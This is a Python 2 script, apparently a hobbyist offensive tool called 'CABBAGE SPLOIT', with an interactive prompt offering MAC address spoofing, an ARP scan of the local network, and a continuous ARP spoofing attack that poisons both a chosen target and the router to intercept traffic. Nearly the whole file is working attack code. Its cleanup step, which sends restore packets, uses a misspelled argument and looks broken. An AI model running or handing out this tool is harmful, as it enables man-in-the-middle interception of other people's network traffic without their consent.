#!/usr/bin/env python
import subprocess
import scapy.all as scapy
import sys


def help():
    print("type \n'change mac' to change mac \n'n scan' to scan for devices in your LAN \n'arp spoof' to do arp spoofing")




def change_mac():
    newMac = str(raw_input("set new mac address>> "))
    interface = raw_input("set the interface to change mac>> ")
    # use list for security reasons...
    subprocess.call(['ifconfig',interface,'down'])
    subprocess.call(['ifconfig',interface,'hw','ether',newMac])
    subprocess.call(['ifconfig',interface,'up'])
    print("[+] mac address of "+interface+" changed to "+newMac)
      

def netScan(getway):
    ip =  str(getway + '/24')
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ='ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast/arp_req
    answered, unanswered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)
    for answers in answered:
        if answers[1].psrc == getway:
            print("\nrouter")
            print('ip address: ' + answers[1].psrc)
            print('mac address: ' + answers[1].hwsrc)
        else:
            print('\nip address: ' + answers[1].psrc)
            print('mac address: ' + answers[1].hwsrc)
        # below print is just for readablity
        print("-------------------------------------------")

def arpSpoof():
    getway = str(raw_input("type your getaway IP>> "))
    netScan(getway)
    target_ip = raw_input("choose taget's IP>>")
    router_mac = raw_input("type mac address of your router>>")
    target_mac = raw_input("type mac address of your target>>")
    packet1 = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = getway)
    packet2 = scapy.ARP(op=2, pdst = getway, hwdst = router_mac, psrc = target_ip)
    sent_packet_count = 0
    try:
        while True:
            scapy.send(packet1, verbose=False)
            scapy.send(packet2, verbose=False)
            print("\r[+]packet sent: "+ str(sent_packet_count)),
            sys.stdout.flush()
            sent_packet_count+=2
    except KeyboardInterrupt:
        packetT = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, pwsrc=getway, hwsrc=router_mac)
        packetr = scapy.ARP(op=2, pdst=getway, hwdst=router_mac, pwsrc=target_ip, hwsrc=target_mac)
        scapy.send(packetT, count=4, verbose=False)
        scapy.send(packetr, count=4, verbose=False)
        print('\n[-] Detected CTRL+C....... Resetting')



print('\n                         <CABBAGE SPLOIT>\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ')
print('type "help" for help')
running = True
while running:
    command = str(raw_input("cabsploit> "))
    if command == "change mac":
        change_mac()

    elif command == 'n scan':
        getway = str(raw_input("type your getaway IP>> "))
        netScan(getway)

    elif command == 'exit':
        running = False

    elif command == 'h' or command =='help':
        help()

    elif command == 'arp spoof':
        arpSpoof()
    else:
        print("invalid command")
        help()


print("[+]exited...\nbye\n- - - - - - - - - - - - - - - - - - - - - - - - - - -")
